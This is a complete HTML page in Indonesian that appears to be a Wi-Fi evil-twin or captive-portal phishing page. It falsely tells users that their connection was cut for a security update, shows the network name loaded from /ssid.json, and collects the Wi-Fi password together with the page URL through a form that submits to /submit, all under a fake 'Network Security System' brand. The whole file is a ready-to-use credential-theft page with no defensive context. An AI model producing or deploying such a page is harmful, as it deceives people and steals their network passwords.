<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Jaringan - 2026</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #000;
    padding: 20px;
    color: #fff;
  }
  .card {
    background: #111;
    border: 1px solid #333;
    border-radius: 20px;
    padding: 40px 32px;
    max-width: 420px;
    width: 100%;
    box-shadow: 0 25px 60px rgba(255,255,255,0.05);
    animation: slideUp 0.5s ease;
  }
  @keyframes slideUp {
    from { opacity: 0; transform: translateY(20px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  .logo {
    width: 64px; height: 64px;
    margin: 0 auto 20px;
    background: #fff;
    color: #000;
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    font-size: 32px;
    font-weight: 700;
    box-shadow: 0 8px 24px rgba(255,255,255,0.15);
  }
  h1 {
    font-size: 22px;
    font-weight: 600;
    text-align: center;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
    color: #fff;
  }
  .ssid {
    text-align: center;
    font-size: 14px;
    color: #000;
    background: #fff;
    font-weight: 500;
    margin-bottom: 24px;
    padding: 6px 14px;
    border-radius: 20px;
    display: inline-block;
    width: 100%;
  }
  .message {
    font-size: 14px;
    line-height: 1.6;
    color: rgba(255,255,255,0.7);
    text-align: center;
    margin-bottom: 28px;
  }
  label {
    display: block;
    font-size: 13px;
    color: rgba(255,255,255,0.55);
    margin-bottom: 8px;
    font-weight: 500;
  }
  input[type=password] {
    width: 100%;
    padding: 14px 16px;
    font-size: 15px;
    background: #000;
    border: 1px solid #444;
    border-radius: 12px;
    color: #fff;
    outline: none;
    transition: all 0.2s;
  }
  input[type=password]:focus {
    border-color: #fff;
    background: #000;
    box-shadow: 0 0 0 3px rgba(255,255,255,0.12);
  }
  input[type=password]::placeholder { color: rgba(255,255,255,0.3); }
  button {
    width: 100%;
    margin-top: 20px;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    color: #000;
    background: #fff;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    transition: transform 0.15s, box-shadow 0.2s;
    box-shadow: 0 8px 24px rgba(255,255,255,0.15);
  }
  button:active { transform: scale(0.98); }
  button:hover { box-shadow: 0 12px 32px rgba(255,255,255,0.25); }
  .footer {
    text-align: center;
    font-size: 12px;
    color: rgba(255,255,255,0.35);
    margin-top: 24px;
  }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">!</div>
    <h1>Verifikasi Jaringan</h1>
    <div style="text-align:center;">
      <span class="ssid" id="ssid">Memuat...</span>
    </div>
    <p class="message">
      Koneksi Anda terputus sementara untuk pembaruan keamanan.
      Silakan masukkan kata sandi Wi-Fi untuk melanjutkan. Router akan otomatis tersambung kembali setelah Anda memasukkan kata sandi.
    </p>
    <form action="/submit" method="get">
      <label for="password">Kata Sandi Wi-Fi</label>
      <input type="password" id="password" name="password"
             placeholder="Masukkan kata sandi" minlength="8"
             required autofocus autocomplete="off">
      <input type="hidden" name="user" id="user" value="">
      <input type="hidden" name="url" id="url" value="">
      <button type="submit">Hubungkan Ulang</button>
    </form>
    <div class="footer">© 2026 Network Security System</div>
  </div>

  <script>
    fetch('/ssid.json').then(r => r.json()).then(d => {
      document.getElementById('ssid').textContent = d.ssid || 'Masukan Kata Sandi anda untuk melanjutkan';
    }).catch(() => {
      document.getElementById('ssid').textContent = 'Masukan Kata Sandi anda untuk melanjutkan';
    });
    document.getElementById('url').value = location.href;
  </script>
</body>
</html>
